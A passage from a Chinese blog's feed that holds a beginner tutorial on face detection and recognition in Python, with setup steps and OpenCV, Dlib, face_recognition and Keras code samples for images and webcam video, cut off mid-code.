title="正则表达式学习网站"></a>正则表达式学习网站</h2><p><a href="http://tool.chinaz.com/regex/" target="_blank" rel="noopener">正则表达式在线测试-站长工具</a><br><a href="https://c.runoob.com/front-end/854" target="_blank" rel="noopener">正则表达式在线测试-菜鸟工具</a><br><a href="http://www.runoob.com/regexp/regexp-syntax.html" target="_blank" rel="noopener">正则表达式教程-菜鸟教程</a></p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> regex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人脸检测与识别基础教程</title>
      <link href="/2018/face-detection-and-recognition-basic-tutorial.html"/>
      <url>/2018/face-detection-and-recognition-basic-tutorial.html</url>
      
        <content type="html"><![CDATA[<p>这里我们将要介绍如何使用python进行简单的人脸检测与人脸识别，并且通过gpu来加速。</p><p>注意：这里都是基础内容，如果需要更加强大深入的请出门左转。</p><a id="more"></a><h2 id="一、环境搭建与资源下载"><a href="#一、环境搭建与资源下载" class="headerlink" title="一、环境搭建与资源下载"></a>一、环境搭建与资源下载</h2><p>下面介绍简单人脸检测与识别需要使用到的几个重要依赖。</p><h3 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h3><p>我所使用的环境是windows 10 + python3.6(64位)</p><h3 id="python库"><a href="#python库" class="headerlink" title="python库"></a>python库</h3><ol><li>numpy</li><li>OpenCV</li><li>Dlib</li><li>face_recognition</li><li>haarcascades</li><li>shape_predictor</li></ol><blockquote><p><strong>小基础</strong><br>python安装依赖可以选择在线安装，如 <code>pip install 依赖名</code><br>也可以选择使用whl文件安装，如 <code>pip install whl文件位置</code>  </p></blockquote><h4 id="1-python扩展程序集：numpy"><a href="#1-python扩展程序集：numpy" class="headerlink" title="1. python扩展程序集：numpy"></a>1. python扩展程序集：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#numpy" target="_blank" rel="noopener">numpy</a></h4><p>基于我的环境，我使用的是<code>numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl</code>这个版本，大家可以根据自己环境选择适合自己的版本下载。</p><p>安装使用命令 <code>pip3 install numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl</code>  </p><h4 id="2-计算机视觉库：OpenCV"><a href="#2-计算机视觉库：OpenCV" class="headerlink" title="2. 计算机视觉库：OpenCV"></a>2. 计算机视觉库：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#opencv" target="_blank" rel="noopener">OpenCV</a></h4><p>我使用的是<code>opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl</code>这个版本。</p><p>安装使用命令 <code>pip3 install opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl</code>  </p><h4 id="3-机器学习c-算法库：Dlib"><a href="#3-机器学习c-算法库：Dlib" class="headerlink" title="3. 机器学习c++算法库：Dlib"></a>3. 机器学习c++算法库：<a href="https://pypi.org/simple/dlib/" target="_blank" rel="noopener">Dlib</a></h4><p>我使用的是<code>dlib-19.8.1-cp36-cp36m-win_amd64.whl</code>。</p><p>安装使用命令 <code>pip3 install dlib-19.8.1-cp36-cp36m-win_amd64.whl</code>  </p><h4 id="4-人脸识别集成库：face-recognition"><a href="#4-人脸识别集成库：face-recognition" class="headerlink" title="4. 人脸识别集成库：face_recognition"></a>4. 人脸识别集成库：<a href="https://github.com/ageitgey/face_recognition" target="_blank" rel="noopener">face_recognition</a></h4><p>安装使用命令 <code>pip3 install face_recognition</code>  </p><h4 id="5-深度学习库：Keras"><a href="#5-深度学习库：Keras" class="headerlink" title="5. 深度学习库：Keras"></a>5. 深度学习库：<a href="https://keras.io/" target="_blank" rel="noopener">Keras</a></h4><p>安装使用命令 <code>pip3 install keras</code></p><p>前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装</p><h4 id="6-机器学习框架：TensorFlow"><a href="#6-机器学习框架：TensorFlow" class="headerlink" title="6. 机器学习框架：TensorFlow"></a>6. 机器学习框架：<a href="https://www.tensorflow.org/?hl=zh-cn" target="_blank" rel="noopener">TensorFlow</a></h4><p>安装使用命令： <code>pip3 install tensorflow</code></p><p>前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装</p><h3 id="人脸识别用到的数据模型"><a href="#人脸识别用到的数据模型" class="headerlink" title="人脸识别用到的数据模型"></a>人脸识别用到的数据模型</h3><p>基于目前的数据量和个人知识与能力，我还不能自己利用机器学习来训练数据模型，所以使用的是国外别人已经训练好的数据模型。</p><h4 id="1-OpenCV使用到的人脸分类模型xml：haarcascades"><a href="#1-OpenCV使用到的人脸分类模型xml：haarcascades" class="headerlink" title="1. OpenCV使用到的人脸分类模型xml：haarcascades"></a>1. OpenCV使用到的人脸分类模型xml：<a href="https://github.com/opencv/opencv/tree/master/data/haarcascades" target="_blank" rel="noopener">haarcascades</a></h4><p>上面链接中所有的xml都推荐下载到本地备用，我所使用的是<code>haarcascade_frontalface_default.xml</code>  </p><h4 id="2-Dlib使用到的人脸识别训练模型：shape-predictor"><a href="#2-Dlib使用到的人脸识别训练模型：shape-predictor" class="headerlink" title="2. Dlib使用到的人脸识别训练模型：shape_predictor"></a>2. Dlib使用到的人脸识别训练模型：<a href="http://dlib.net/files/" target="_blank" rel="noopener">shape_predictor</a></h4><p>我所使用的是<code>shape_predictor_68_face_landmarks.dat.bz2</code>和<code>shape_predictor_5_face_landmarks.dat.bz2</code>这两个。</p><p>推荐大家把这两个都下载下来，并解压，我们所需要的是里面的<code>dat</code>数据文件。  </p><blockquote><p>好了，有了上面的这些基础环境与依赖，我们可以继续我们接下来的简单人脸检测与识别了。<br>没有装好这些环境的同学请注意了，我们班级已经与谷歌、百度等大公司达成合作，有任何问题请在<a href="https://www.google.com" target="_blank" rel="noopener">Google</a>和<a href="https://www.baidu.com" target="_blank" rel="noopener">Baidu</a>进行搜索，他们会提供你所需要的答案。</p></blockquote><h2 id="二、简单人脸检测"><a href="#二、简单人脸检测" class="headerlink" title="二、简单人脸检测"></a>二、简单人脸检测</h2><blockquote><p>在这一节不会讲解复杂的人脸识别，只是先通过简单的小例子让大家先了解一下人脸识别需要用到什么、人脸识别的基本步骤等等最简单的内容。</p></blockquote><h3 id="1-利用OpenCV进行图片人脸检测并进行标注"><a href="#1-利用OpenCV进行图片人脸检测并进行标注" class="headerlink" title="1. 利用OpenCV进行图片人脸检测并进行标注"></a>1. 利用<strong>OpenCV</strong>进行<strong>图片</strong>人脸检测并进行标注</h3><h4 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h4><ol><li>先将图片灰度化，为了降低图片颜色维度，减少后续识别计算量</li><li>然后利用OpenCV加载别人训练好的人脸分类器，通过这个分类器来检测人脸</li><li>在原图片上画一个矩形，然后显示出来</li></ol><h4 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">filepath = <span class="string">"img/sdu/6.jpg"</span></span><br><span class="line"></span><br><span class="line">classifier = cv2.CascadeClassifier(</span><br><span class="line">    <span class="string">"lib/opencv/haarcascades/haarcascade_frontalface_default.xml"</span></span><br><span class="line">)</span><br><span class="line">img = cv2.imread(filepath)  <span class="comment"># 读取图片</span></span><br><span class="line">gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)  <span class="comment"># 灰度化</span></span><br><span class="line">color = (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>)  <span class="comment"># 定义绘制颜色</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用识别人脸</span></span><br><span class="line">faceRects = classifier.detectMultiScale(</span><br><span class="line">    gray, scaleFactor=<span class="number">1.2</span>, minNeighbors=<span class="number">3</span>, minSize=(<span class="number">32</span>, <span class="number">32</span>))</span><br><span class="line"><span class="keyword">if</span> len(faceRects):  <span class="comment"># 大于0则检测到人脸</span></span><br><span class="line">    <span class="keyword">for</span> faceRect <span class="keyword">in</span> faceRects:  <span class="comment"># 单独框出每一张人脸</span></span><br><span class="line">        x, y, w, h = faceRect</span><br><span class="line">        <span class="comment"># 框出人脸</span></span><br><span class="line">        cv2.rectangle(img, (x, y), (x + h, y + w), color, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">"image"</span>, img)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="2-利用OpenCV进行视频人脸检测并进行标注"><a href="#2-利用OpenCV进行视频人脸检测并进行标注" class="headerlink" title="2. 利用OpenCV进行视频人脸检测并进行标注"></a>2. 利用<strong>OpenCV</strong>进行<strong>视频</strong>人脸检测并进行标注</h3><blockquote><p>在人脸检测方面实现方法与上面图片的实现方法一模一样，只是这个图片是从摄像头不断获取的。</p></blockquote><h4 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(img)</span>:</span></span><br><span class="line">    grayImg = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    classifier = cv2.CascadeClassifier(</span><br><span class="line">        <span class="string">"lib/opencv/haarcascades/haarcascade_frontalface_default.xml"</span></span><br><span class="line">    )</span><br><span class="line">    color = (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>)  <span class="comment"># 定义绘制颜色</span></span><br><span class="line">    faceRects = classifier.detectMultiScale(</span><br><span class="line">        grayImg, scaleFactor=<span class="number">1.2</span>, minNeighbors=<span class="number">3</span>, minSize=(<span class="number">32</span>, <span class="number">32</span>))</span><br><span class="line">    <span class="keyword">if</span> len(faceRects):  <span class="comment"># 大于0则检测到人脸</span></span><br><span class="line">        <span class="keyword">for</span> faceRect <span class="keyword">in</span> faceRects:  <span class="comment"># 单独框出每一张人脸</span></span><br><span class="line">            x, y, w, h = faceRect</span><br><span class="line">            cv2.rectangle(img, (x, y), (x + h, y + w), color, <span class="number">2</span>)</span><br><span class="line">    cv2.imshow(<span class="string">"image"</span>, img)</span><br><span class="line"></span><br><span class="line">cap = cv2.VideoCapture(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    scan(frame)</span><br><span class="line">    <span class="keyword">if</span> cv2.waitKey(<span class="number">1</span>) &amp; <span class="number">0xFF</span> == ord(<span class="string">'q'</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cap.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="3-利用Dlib进行图片人脸检测并标注"><a href="#3-利用Dlib进行图片人脸检测并标注" class="headerlink" title="3. 利用Dlib进行图片人脸检测并标注"></a>3. 利用<strong>Dlib</strong>进行<strong>图片</strong>人脸检测并标注</h3><blockquote><p>Dlib里面有很多算法，可以实现一些复杂的人脸识别。<br>在这一小节只演示用dlib内部自带的默认的人脸识别模型来进行人脸检测</p></blockquote><h4 id="实现代码-2"><a href="#实现代码-2" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> dlib</span><br><span class="line"></span><br><span class="line">path = <span class="string">"img/sdu/658.jpg"</span></span><br><span class="line">img = cv2.imread(path)</span><br><span class="line">gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line"><span class="comment">#人脸分类器</span></span><br><span class="line">detector = dlib.get_frontal_face_detector()</span><br><span class="line"></span><br><span class="line">dets = detector(gray, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> face <span class="keyword">in</span> dets:</span><br><span class="line">    <span class="comment">#在图片中标注人脸边框，并显示</span></span><br><span class="line">    left = face.left()</span><br><span class="line">    top = face.top()</span><br><span class="line">    right = face.right()</span><br><span class="line">    bottom = face.bottom()</span><br><span class="line">    cv2.rectangle(img, (left, top), (right, bottom), (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line">    cv2.imshow(<span class="string">"image"</span>, img)</span><br><span class="line"></span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="4-利用Dlib进行视频人脸检测并进行标注"><a href="#4-利用Dlib进行视频人脸检测并进行标注" class="headerlink" title="4. 利用Dlib进行视频人脸检测并进行标注"></a>4. 利用<strong>Dlib</strong>进行<strong>视频</strong>人脸检测并进行标注</h3><blockquote><p>都是相同的步骤呀，与上面大同小异</p></blockquote><h4 id="实现代码-3"><a href="#实现代码-3" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> dlib</span><br><span class="line"></span><br><span class="line">detector = dlib.get_frontal_face_detector()  <span class="comment">#使用默认的人类识别器模型</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(img)</span>:</span></span><br><span class="line">    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    dets = detector(gray, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> face <span class="keyword">in</span> dets:</span><br><span class="line">        left = face.left()</span><br><span class="line">        top = face.top()</span><br><span class="line">        right = face.right()</span><br><span class="line">        bottom = face.bottom()</span><br><span class="line">        cv2.rectangle(img, (left, top), (right, bottom), (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line">        cv2.imshow(<span class="string">"image"</span>, img)</span><br><span class="line"></span><br><span class="line">cap = cv2.VideoCapture(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    ret, img = cap.read()</span><br><span class="line">    scan(img)</span><br><span class="line">    <span class="keyword">if</span> cv2.waitKey(<span class="number">1</span>) &amp; <span class="number">0xFF</span> == ord(<span class="string">'q'</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cap.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><blockquote><p>在两个视频中人脸检测中，我们发现<br>在识别准确率上 Dlib &gt; OpenCV<br>但是在速度上 OpenCV &gt; Dlib<br>后面我们会有专门的内容讲解通过GPU加速Dlib</p></blockquote><h2 id="三、稍微复杂的人脸检测与识别"><a href="#三、稍微复杂的人脸检测与识别" class="headerlink" title="三、稍微复杂的人脸检测与识别"></a>三、稍微复杂的人脸检测与识别</h2><blockquote><p>上面已经介绍过了简单的从一张图片或视频中的每一帧中检测到人脸并进行画框<br>在这一小节，我们会进一步利用Dlib这个库中更加强大的工具来实现稍微发杂一些的人脸检测任务</p></blockquote><h3 id="1-检测人脸的5个关键点和68个关键点并显示出来"><a href="#1-检测人脸的5个关键点和68个关键点并显示出来" class="headerlink" title="1. 检测人脸的5个关键点和68个关键点并显示出来"></a>1. 检测人脸的5个关键点和68个关键点并显示出来</h3><h4 id="实现代码-4"><a href="#实现代码-4" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> dlib</span><br><span class="line"></span><br><span class="line">path = <span class="string">"img/ag.png"</span></span><br><span class="line">img = cv2.imread(path)</span><br><span class="line">gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line"><span class="comment">#人脸分类器</span></span><br><span class="line">detector = dlib.get_frontal_face_detector()</span><br><span class="line"><span class="comment"># 获取人脸检测器</span></span><br><span class="line">predictor = dlib.shape_predictor(</span><br><span class="line">    <span class="string">"lib/dlib/shape_predictor_68_face_landmarks.dat"</span> </span><br><span class="line">    <span class="comment">#这里使用68点的模型，将68改成5就是使用5点的模型</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">dets = detector(gray, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> face <span class="keyword">in</span> dets:</span><br><span class="line">    shape = predictor(img, face)  <span class="comment"># 寻找人脸的68个标定点</span></span><br><span class="line">    <span class="comment"># 遍历所有点，打印出其坐标，并圈出来.</span></span><br><span class="line">    <span class="keyword">for</span> pt <span class="keyword">in</span> shape.parts():</span><br><span class="line">        pt_pos = (pt.x, pt.y)</span><br><span class="line">        cv2.circle(img, pt_pos, <span class="number">1</span>, (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line">    cv2.imshow(<span class="string">"image"</span>, img)</span><br><span class="line"></span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><blockquote><p>上人脸识别的主菜</p></blockquote><h3 id="2-利用face-recognition进行人脸识别"><a href="#2-利用face-recognition进行人脸识别" class="headerlink" title="2. 利用face_recognition进行人脸识别"></a>2. 利用<strong>face_recognition</strong>进行人脸识别</h3><h4 id="实现代码-5"><a href="#实现代码-5" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> face_recognition</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = <span class="string">"img/face_5107"</span></span><br><span class="line">cap = cv2.VideoCapture(<span class="number">0</span>)</span><br><span class="line">total_image_name = []</span><br><span class="line">total_face_encoding = []</span><br><span class="line"><span class="keyword">for</span> fn <span class="keyword">in</span> os.listdir(path):  <span class="comment">#fn 表示的是文件名q</span></span><br><span class="line">    print(path + <span class="string">"/"</span> + fn)</span><br><span class="line">    total_face_encoding.append(</span><br><span class="line">        face_recognition.face_encodings(</span><br><span class="line">            face_recognition.load_image_file(path + <span class="string">"/"</span> + fn))[<span class="number">0</span>])</span><br><span class="line">    fn = fn[:(len(fn) - <span class="number">4</span>)]  <span class="comment">#截取图片名（这里应该把images文件中的图片名命名为为人物名）</span></span><br><span class="line">    total_image_name.append(fn)  <span class="comment">#图片名字列表</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    <span class="comment"># 发现在视频帧所有的脸和face_enqcodings</span></span><br><span class="line">    face_locations = face_recognition.face_locations(frame)</span><br><span class="line">    face_encodings = face_recognition.face_encodings(frame, face_locations)</span><br><span class="line">    <span class="comment"># 在这个视频帧中循环遍历每个人脸</span></span><br><span class="line">    <span class="keyword">for</span> (top, right, bottom, left), face_encoding <span class="keyword">in</span> zip(</span><br><span class="line">            face_locations, face_encodings):</span><br><span class="line">        <span class="comment"># 看看面部是否与已知人脸相匹配。</span></span><br><span class="line">        <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(total_face_encoding):</span><br><span class="line">            match = face_recognition.compare_faces(</span><br><span class="line">                [v], face_encoding, tolerance=<span class="number">0.4</span>)</span><br><span class="line">            name = <span class="string">"Unknown"</span></span><br><span class="line">            <span class="keyword">if</span> match[<span class="number">0</span>]:</span><br><span class="line">                name = total_image_name[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 画出一个框，框住脸</span></span><br><span class="line">        cv2.rectangle(frame, (left, top), (right, bottom), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>), <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 画出一个带名字的标签，放在框下</span></span><br><span class="line">        cv2.rectangle(frame, (left, bottom - <span class="number">35</span>), (right, bottom), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>),</span><br><span class="line">                      cv2.FILLED)</span><br><span class="line">        font = cv2.FONT_HERSHEY_DUPLEX</span><br><span class="line">        cv2.putText(frame, name, (left + <span class="number">6</span>, bottom - <span class="number">6</span>), font, <span class="number">1.0</span>,</span><br><span class="line">                    (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 显示结果图像</span></span><br><span class="line">    cv2.imshow(<span class="string">'Video'</span>, frame)</span><br><span class="line">    <span class="keyword">if</span> cv2.waitKey(<span class="number">1</span>) &amp; <span class="number">0xFF</span> == ord(<span class="string">'q'</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cap.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="3-利用face-recognition进行人脸轮廓绘制"><a href="#3-利用face-recognition进行人脸轮廓绘制" class="headerlink" title="3. 利用face_recognition进行人脸轮廓绘制"></a>3. 利用<strong>face_recognition</strong>进行人脸轮廓绘制</h3><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> face_recognition</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将图片文件加载到numpy 数组中</span></span><br><span class="line">image = face_recognition.load_image_file(<span class="string">"img/ag.png"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查找图像中所有面部的所有面部特征</span></span><br><span class="line">face_landmarks_list = face_recognition.face_landmarks(image)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> face_landmarks <span class="keyword">in</span> face_landmarks_list:</span><br><span class="line">    facial_features = [</span><br><span class="line">        <span class="string">'chin'</span>,  <span class="comment"># 下巴</span></span><br><span class="line">        <span class="string">'left_eyebrow'</span>,  <span class="comment"># 左眉毛</span></span><br><span class="line">        <span class="string">'right_eyebrow'</span>,  <span class="comment"># 右眉毛</span></span><br><span class="line">        <span class="string">'nose_bridge'</span>,  <span class="comment"># 鼻樑</span></span><br><span class="line">        <span class="string">'nose_tip'</span>,  <span class="comment"># 鼻尖</span></span><br><span class="line">        <span class="string">'left_eye'</span>,  <span class="comment"># 左眼</span></span><br><span class="line">        <span class="string">'right_eye'</span>,  <span class="comment"># 右眼</span></span><br><span class="line">        <span class="string">'top_lip'</span>,  <span class="comment"># 上嘴唇</span></span><br><span class="line">        <span class="string">'bottom_lip'</span>  <span class="comment"># 下嘴唇</span></span><br><span class="line">    ]</span><br><span class="line">    pil_image = Image.fromarray(image)</span><br><span class="line">    d = ImageDraw.Draw(pil_image)</span><br><span class="line">    <span class="keyword">for</span> facial_feature <span class="keyword">in</span> facial_features:</span><br><span class="line">        d.line(face_landmarks[facial_feature], fill=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), width=<span class="number">2</span>)</span><br><span class="line">    pil_image.show()</span><br></pre></td></tr></table></figure><h3 id="4-利用keras实现性别识别"><a href="#4-利用keras实现性别识别" class="headerlink" title="4. 利用keras实现性别识别"></a>4. 利用<strong>keras</strong>实现性别识别</h3><blockquote><p>使用keras实现性别识别<br>模型数据使用的是<a href="https://github.com/oarriaga/face_classification" target="_blank" rel="noopener">oarriaga/face_classification的模型</a></p></blockquote><h4 id="实现代码-6"><a href="#实现代码-6" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> chineseText</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">"img/xingye-1.png"</span>)</span><br><span class="line">face_classifier = cv2.CascadeClassifier(</span><br><span class="line">    <span class="string">"lib/opencv/haarcascades/haarcascade_frontalface_default.xml"</span></span><br><span class="line">)</span><br><span class="line">gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">faces = face_classifier.detectMultiScale(</span><br><span class="line">    gray, scaleFactor=<span class="number">1.2</span>, minNeighbors=<span class="number">3</span>, minSize=(<span class="number">140</span>, <span class="number">140</span>))</span><br><span class="line"></span><br><span class="line">gender_classifier = load_model(</span><br><span class="line">    <span class="string">"classifier/gender_models/simple_CNN.81-0.96.hdf5"</span>)</span><br><span class="line">gender_labels = &#123;<span 